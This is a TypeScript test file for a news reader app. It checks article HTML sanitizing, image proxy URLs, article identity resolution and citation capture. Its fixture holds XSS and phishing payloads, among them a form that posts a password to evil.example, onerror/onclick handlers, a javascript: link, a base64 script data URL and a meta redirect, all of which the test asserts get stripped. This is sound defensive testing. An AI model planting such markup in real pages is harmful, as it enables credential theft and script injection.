import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { JSDOM } from "jsdom";
import { createServer } from "vite";
import { articleIdentityKey } from "../src/utils/articleIdentity";
import type { Article } from "../src/types";

const { window } = new JSDOM("");
globalThis.window = window as unknown as Window & typeof globalThis;

const testDir = path.dirname(fileURLToPath(import.meta.url));
const root = path.resolve(testDir, "..");
const vite = await createServer({ root, appType: "custom", server: { middlewareMode: true } });
const readerModule = await vite.ssrLoadModule("/src/components/ReaderModal.tsx") as Record<string, unknown>;
const articleReaderModule = await vite.ssrLoadModule("/src/components/reader/ArticleReader.tsx") as Record<string, unknown>;
const sanitizeArticleHtml = readerModule.sanitizeArticleHtml;
const looksLikeArticleHtml = readerModule.looksLikeArticleHtml as ((content?: string) => boolean) | undefined;
const resolveReaderArticle = readerModule.resolveReaderArticle as ((readingArticle: Record<string, unknown> | null, articles: Record<string, unknown>[]) => Record<string, unknown> | null) | undefined;
const resolveArticleImageSrc = articleReaderModule.resolveArticleImageSrc as ((src?: string, articleUrl?: string) => string) | undefined;
const getCitationToolbarPosition = articleReaderModule.getCitationToolbarPosition as ((
  rect: { left: number; top: number; width: number },
  viewportWidth: number,
) => { left: number; top: number }) | undefined;
const buildCitationCapture = readerModule.buildCitationCapture as ((body: HTMLElement, selection: Selection | null, article: Article) => {
  exact: string;
  prefix: string;
  suffix: string;
  paragraph: string;
  heading: string | null;
  articleId: number;
  articleTitle: string;
  source: string;
  sourceUrl?: string;
} | null) | undefined;

assert.equal(typeof sanitizeArticleHtml, "function", "ReaderModal must export its article HTML sanitizer for regression coverage");
assert.equal(typeof looksLikeArticleHtml, "function", "ReaderModal must distinguish HTML exported through markdownContent");
assert.equal(typeof resolveReaderArticle, "function", "ReaderPane must expose its final source resolution for collision coverage");
assert.equal(typeof buildCitationCapture, "function", "ArticleReader must expose deterministic citation capture for regression coverage");
assert.equal(typeof resolveArticleImageSrc, "function", "ArticleReader must expose deterministic image URL resolution for regression coverage");
assert.equal(typeof getCitationToolbarPosition, "function", "ArticleReader must expose viewport-relative citation toolbar positioning");
if (typeof sanitizeArticleHtml !== "function") {
  throw new TypeError("sanitizeArticleHtml is not available");
}

const maliciousArticle = `
  <style>.reader-takeover { position: fixed; inset: 0; z-index: 999999; }</style>
  <form action="https://evil.example/collect">
    <input name="password" value="stolen">
    <button type="submit">Send</button>
  </form>
  <div class="reader-takeover" style="position:fixed;inset:0" onclick="alert(1)">Overlay copy</div>
  <iframe src="https://evil.example/frame"></iframe>
  <object data="https://evil.example/object"></object>
  <embed src="https://evil.example/embed">
  <meta http-equiv="refresh" content="0;url=https://evil.example">
  <p>Useful <strong>article</strong> copy.</p>
  <img src="https://cdn.example.com/photo.jpg" alt="Article photo" onerror="alert(1)">
  <img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" alt="Dangerous data image">
  <a href="https://example.com/source" target="_blank">Safe source</a>
  <a href="javascript:alert(1)">Dangerous link</a>
`;

const sanitized = sanitizeArticleHtml(maliciousArticle) as string;
const document = new JSDOM(`<body>${sanitized}</body>`).window.document;

assert.equal(document.querySelector("style, form, input, button, iframe, object, embed, meta"), null);
assert.equal(document.querySelector("[style], [onclick], [onerror]"), null);
assert.doesNotMatch(sanitized, /position\s*:\s*fixed|reader-takeover|javascript:|data:text\/html/i);
assert.doesNotMatch(sanitized, /Send|stolen/, "Forbidden form contents must be discarded with their controls");
assert.match(sanitized, /<p>Useful <strong>article<\/strong> copy\.<\/p>/);
assert.equal(
  document.querySelector('img[alt="Article photo"]')?.getAttribute("src"),
  "/api/image-proxy?url=https%3A%2F%2Fcdn.example.com%2Fphoto.jpg&referer=",
);
assert.equal(document.querySelector('img[alt="Article photo"]')?.getAttribute("referrerpolicy"), "no-referrer");
assert.equal(document.querySelector('img[alt="Dangerous data image"]')?.hasAttribute("src"), false);
assert.equal(document.querySelector("a")?.getAttribute("href"), "https://example.com/source");
assert.equal(document.querySelectorAll("a")[1]?.hasAttribute("href"), false);

const customFeedHtml = sanitizeArticleHtml(
  '<article><img src="../media/cover.jpg" alt="Custom feed cover"><img src="https://custom-feed.example/photo?w=100&amp;fmt=webp" alt="Entity URL"></article>',
  'https://custom-feed.example/posts/2026/story',
) as string;
const customFeedDocument = new JSDOM(`<body>${customFeedHtml}</body>`).window.document;
assert.equal(
  customFeedDocument.querySelector('img[alt="Custom feed cover"]')?.getAttribute('src'),
  '/api/image-proxy?url=https%3A%2F%2Fcustom-feed.example%2Fposts%2Fmedia%2Fcover.jpg&referer=https%3A%2F%2Fcustom-feed.example%2Fposts%2F2026%2Fstory',
  'HTML article images from custom feeds must resolve to a same-origin proxy URL under the strict production CSP',
);
assert.equal(
  customFeedDocument.querySelector('img[alt="Entity URL"]')?.getAttribute('src'),
  '/api/image-proxy?url=https%3A%2F%2Fcustom-feed.example%2Fphoto%3Fw%3D100%26fmt%3Dwebp&referer=https%3A%2F%2Fcustom-feed.example%2Fposts%2F2026%2Fstory',
  'HTML entity decoding must produce the same canonical image URL on both sides of proxy authorization',
);

if (typeof looksLikeArticleHtml !== "function") {
  throw new TypeError("looksLikeArticleHtml is not available");
}
assert.equal(looksLikeArticleHtml("<p>已提取的原文</p>"), true);
assert.equal(looksLikeArticleHtml("# Markdown 标题\n\n正文"), false);
assert.equal(looksLikeArticleHtml("比较 <Component> 与普通文本"), false);
assert.equal(looksLikeArticleHtml("# Markdown 标题\n\n<p>内嵌 HTML</p>"), false);

if (typeof resolveArticleImageSrc !== "function") {
  throw new TypeError("resolveArticleImageSrc is not available");
}
assert.equal(
  resolveArticleImageSrc("../images/photo.jpg", "https://example.com/articles/2026/story"),
  "/api/image-proxy?url=https%3A%2F%2Fexample.com%2Farticles%2Fimages%2Fphoto.jpg&referer=https%3A%2F%2Fexample.com%2Farticles%2F2026%2Fstory",
  "Relative article images must resolve against the source article before proxying",
);
assert.equal(
  resolveArticleImageSrc("/images/photo.jpg", "not a valid URL"),
  "/images/photo.jpg",
  "A malformed article URL must not throw while rendering a relative image",
);
assert.equal(
  resolveArticleImageSrc("//cdn.example.com/photo.jpg", "not a valid URL"),
  "/api/image-proxy?url=https%3A%2F%2Fcdn.example.com%2Fphoto.jpg&referer=not%20a%20valid%20URL",
  "Protocol-relative images remain usable even when article metadata is malformed",
);
assert.equal(
  resolveArticleImageSrc("//cdn.example.com/photo.jpg", "http://custom-feed.example/story"),
  "/api/image-proxy?url=http%3A%2F%2Fcdn.example.com%2Fphoto.jpg&referer=http%3A%2F%2Fcustom-feed.example%2Fstory",
  "Protocol-relative images must inherit the article protocol just like server-side URL normalization",
);
assert.equal(
  resolveArticleImageSrc("HTTPS://CDN.EXAMPLE.COM:443/a/../photo.jpg", "https://custom-feed.example/story"),
  "/api/image-proxy?url=https%3A%2F%2Fcdn.example.com%2Fphoto.jpg&referer=https%3A%2F%2Fcustom-feed.example%2Fstory",
  "Absolute image URLs must use the same canonical URL serialization as server-side authorization",
);

if (typeof resolveReaderArticle !== "function") {
  throw new TypeError("resolveReaderArticle is not available");
}
const sharedFields = { saved: false, source: "来源", topic: "主题", time: "今天", excerpt: "摘要", content: "正文", cards: [] };
const wrongSameId = { ...sharedFields, id: 7, title: "错误文章", url: "https://example.com/wrong" };
const expectedSameId = { ...sharedFields, id: 7, title: "正确文章", url: "https://example.com/expected" };
assert.equal(
  resolveReaderArticle(expectedSameId, [wrongSameId, expectedSameId]),
  expectedSameId,
  "ReaderPane final rendering must prefer URL when numeric ids collide",
);
const wrongUrlLess = { ...sharedFields, id: 9, source: "来源甲", title: "同 ID 错误文章" };
const expectedUrlLess = { ...sharedFields, id: 9, source: "来源乙", title: "同 ID 正确文章" };
assert.equal(
  resolveReaderArticle(expectedUrlLess, [wrongUrlLess, expectedUrlLess]),
  expectedUrlLess,
  "ReaderPane must use source and title before numeric id for URL-less articles",
);
assert.notEqual(
  articleIdentityKey(wrongUrlLess),
  articleIdentityKey(expectedUrlLess),
  "ReaderPane state resets must distinguish URL-less articles that share a numeric id",
);

if (typeof buildCitationCapture !== "function") {
  throw new TypeError("buildCitationCapture is not available");
}
const citationDom = new JSDOM(`
  <main id="article-body">
    <h2>Nearest heading</h2>
    <p>${"p".repeat(130)}TARGET${"s".repeat(130)}</p>
  </main>
  <p id="outside">Outside copy</p>
`);
const citationDocument = citationDom.window.document;
const articleBody = citationDocument.getElementById("article-body");
const paragraph = articleBody?.querySelector("p");
const paragraphText = paragraph?.firstChild;
assert.ok(articleBody instanceof citationDom.window.HTMLElement);
assert.ok(paragraphText);
const selection = citationDom.window.getSelection();
assert.ok(selection);
const citationRange = citationDocument.createRange();
citationRange.setStart(paragraphText, 130);
citationRange.setEnd(paragraphText, 136);
selection.removeAllRanges();
selection.addRange(citationRange);
const citationArticle: Article = {
  id: 42,
  saved: false,
  source: "Citation source",
  topic: "Tests",
  time: "Today",
  title: "Citation article",
  excerpt: "Summary",
  content: paragraph?.textContent || "",
  url: "https://example.com/citation",
  cards: [],
};
const citation = buildCitationCapture(articleBody, selection, citationArticle);
assert.ok(citation);
assert.equal(citation.exact, "TARGET");
assert.equal(citation.prefix, "p".repeat(120));
assert.equal(citation.suffix, "s".repeat(120));
assert.equal(citation.paragraph, paragraph?.textContent);
assert.equal(citation.heading, "Nearest heading");
assert.deepEqual(
  {
    articleId: citation.articleId,
    articleTitle: citation.articleTitle,
    source: citation.source,
    sourceUrl: citation.sourceUrl,
  },
  {
    articleId: 42,
    articleTitle: "Citation article",
    source: "Citation source",
    sourceUrl: "https://example.com/citation",
  },
);

const outsideText = citationDocument.getElementById("outside")?.firstChild;
assert.ok(outsideText);
const outsideRange = citationDocument.createRange();
outsideRange.selectNodeContents(outsideText);
selection.removeAllRanges();
selection.addRange(outsideRange);
assert.equal(buildCitationCapture(articleBody, selection, citationArticle), null, "Reader chrome and outside text must never become a citation");

const oversizedParagraph = citationDocument.createElement("p");
oversizedParagraph.textContent = "x".repeat(2001);
articleBody.append(oversizedParagraph);
const oversizedRange = citationDocument.createRange();
oversizedRange.selectNodeContents(oversizedParagraph);
selection.removeAllRanges();
selection.addRange(oversizedRange);
assert.equal(buildCitationCapture(articleBody, selection, citationArticle), null, "Citation selections are capped at 2000 characters");

if (typeof getCitationToolbarPosition !== "function") {
  throw new TypeError("getCitationToolbarPosition is not available");
}
assert.deepEqual(
  getCitationToolbarPosition({ left: 700, top: 300, width: 80 }, 800),
  { left: 620, top: 254 },
  "The citation toolbar must clamp to the desktop viewport instead of a transformed reader rail",
);
assert.deepEqual(
  getCitationToolbarPosition({ left: 400, top: 20, width: 80 }, 320),
  { left: 168, top: 8 },
  "The citation toolbar must retain an eight-pixel mobile viewport gutter",
);

const readerSource = readFileSync(path.join(testDir, "../src/components/reader/ArticleReader.tsx"), "utf8");
assert.doesNotMatch(readerSource, /rehypeRaw/, "ReactMarkdown must not parse untrusted raw HTML");
assert.equal((readerSource.match(/dangerouslySetInnerHTML/g) || []).length, 1);
assert.match(
  readerSource,
  /dangerouslySetInnerHTML=\{\{\s*__html:\s*sanitizedArticleContent\s*\}\}/,
  "The article HTML insertion path must use the DOMPurify result",
);
assert.match(readerSource, /onMouseUp=\{scheduleCitationToolbarUpdate\}/, "Mouse selections must open citation actions");
assert.match(readerSource, /onKeyUp=\{scheduleCitationToolbarUpdate\}/, "Keyboard selections must open citation actions");
assert.match(
  readerSource,
  /typeof document !== ['"]undefined['"][\s\S]*?createPortal\([\s\S]*?document\.body/,
  "The fixed citation toolbar must portal to document.body and remain SSR-safe",
);
assert.match(readerSource, /data-reader-citation-toolbar="true"[\s\S]*?className="fixed z-\[260\]/, "The portaled toolbar must stay viewport-fixed above the three-column rails");
assert.match(readerSource, /handleCitationAction\('add-to-canvas'\)/);
assert.match(readerSource, /handleCitationAction\('add-and-connect'\)/);
const citationActionSource = readerSource.match(/const handleCitationAction[\s\S]*?\n  };/)?.[0] || "";
assert.doesNotMatch(citationActionSource, /onSaveArticle|fetch\(|\/api\//, "Citation actions must not save articles or invoke AI automatically");
assert.doesNotMatch(readerSource, /<audio\b/, "The shared reader must not create a second podcast media element");
assert.match(readerSource, /typeof audio === ['"]function['"]/, "A caller may explicitly render the application-level playback surface");
assert.doesNotMatch(readerSource, /张小珺商业访谈录/, "Podcast capability must not depend on a hard-coded source name");
assert.match(readerSource, /signal:\s*requestController\.signal/, "Translation requests must be abortable when the article or language changes");
assert.match(
  readerSource,
  /requestArticleIdentity !== currentArticleIdentityRef\.current/,
  "A late translation response must be rejected when it belongs to another article",
);
assert.match(
  readerSource,
  /requestTargetLang !== targetLangRef\.current/,
  "A late translation response must be rejected when it belongs to another target language",
);

await vite.close();
citationDom.window.close();
console.log("PASS: reader strips persistent article HTML and CSS injection vectors");
